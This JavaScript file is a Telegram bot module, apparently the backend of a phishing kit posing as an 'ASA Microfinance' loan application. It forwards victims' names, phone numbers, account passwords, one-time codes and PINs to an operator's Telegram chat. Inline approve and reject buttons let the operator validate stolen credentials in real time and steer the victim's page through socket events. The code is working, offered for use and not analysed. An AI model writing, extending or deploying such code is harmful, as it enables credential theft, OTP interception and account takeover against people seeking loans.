/**
 * bot_manager.js
 * ASA Microfinance Telegram Manager
 * FIXED: Webhook mode and data-parsing for Render
 */

require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// =====================================================
// ENV CONFIG
// =====================================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
// Ensure URL starts with https and has no trailing slash
let RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL; 
if (RENDER_URL && RENDER_URL.endsWith('/')) RENDER_URL = RENDER_URL.slice(0, -1);

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in Environment Variables");
    process.exit(1);
}

// =====================================================
// TELEGRAM BOT INITIALIZATION
// =====================================================
// polling: false is used because server.js handles the POST requests via webhook
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

if (RENDER_URL) {
    const webhookUrl = `${RENDER_URL}/bot${BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
        .then(() => console.log(`🤖 Webhook successfully set: ${webhookUrl}`))
        .catch(err => console.error(`❌ Webhook Error: ${err.message}`));
} else {
    console.warn("⚠️ No RENDER_EXTERNAL_URL found. Webhook not set. Buttons may not work unless polling is enabled.");
}

// =====================================================
// UTILITIES
// =====================================================
const escapeHTML = (str) => {
    if (!str) return "N/A";
    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
};

const currency = (n) => `$${Number(n || 0).toLocaleString()}`;
const phoneFormat = (p) => p ? `+232 ${p}` : "N/A";

// =====================================================
// CORE SENDER
// =====================================================
const send = (message, options = {}) => {
    return bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: "HTML",
        ...options
    }).catch(err => {
        console.error("Telegram Send Error:", err.message);
    });
};

// =====================================================
// STEP SENDERS
// =====================================================
const sendStep1 = (d) => send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);

const sendStep2 = (d) => send(`👤 <b>STEP 2 – PERSONAL INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> ${phoneFormat(d.phone)}`);

const sendStep3 = (d) => send(`💼 <b>STEP 3 – EMPLOYMENT</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n💰 <b>Income:</b> ${currency(d.income)}\n🏢 <b>Employer:</b> ${escapeHTML(d.employer)}`);

const sendStep4 = (d) => {
    send(`🔐 <b>STEP 4 – PASSWORD</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)}\n🔑 <b>Password:</b> <code>${escapeHTML(d.password)}</code>`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE", callback_data: `apr_pw_${d.appId}` },
                { text: "❌ REJECT", callback_data: `rej_pw_${d.appId}` }
            ]]
        }
    });
};

const sendStep5 = (d) => send(`🔢 <b>STEP 5 – OTP</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n🔢 <b>OTP:</b> <code>${escapeHTML(d.otp)}</code>`);

const sendStep6 = (d) => {
    send(`🔐 <b>STEP 6 – PIN</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n🔐 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE", callback_data: `apr_pn_${d.appId}` },
                { text: "❌ REJECT", callback_data: `rej_pn_${d.appId}` }
            ]]
        }
    });
};

// =====================================================
// CALLBACK HANDLER
// =====================================================
bot.on("callback_query", async (query) => {
    const { data, id, message } = query;
    // Shortened actions (apr/rej) to stay under 64-byte limit
    const [action, type, appId] = data.split("_");

    await bot.answerCallbackQuery(id).catch(() => {});

    const io = global.io;
    if (!io) {
        console.error("❌ Socket.io instance missing from global scope");
        return;
    }

    if (action === "apr") {
        const event = (type === "pw") ? "password-verified" : "pin-verified";
        const payload = (type === "pn") ? { referenceId: "ASA-" + Math.floor(Math.random() * 900000 + 100000) } : null;
        
        io.to(appId).emit(event, payload);
        
        bot.editMessageText(`${message.text}\n\n✅ <b>APPROVED BY ADMIN</b>`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }

    if (action === "rej") {
        const event = (type === "pw") ? "password-rejected" : "pin-rejected";
        io.to(appId).emit(event);
        
        bot.editMessageText(`${message.text}\n\n❌ <b>REJECTED BY ADMIN</b>`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }
});

module.exports = {
    bot, 
    sendStep1,
    sendStep2,
    sendStep3,
    sendStep4,
    sendStep5,
    sendStep6,
    sendTelegramMessage: (msg) => send(msg)
};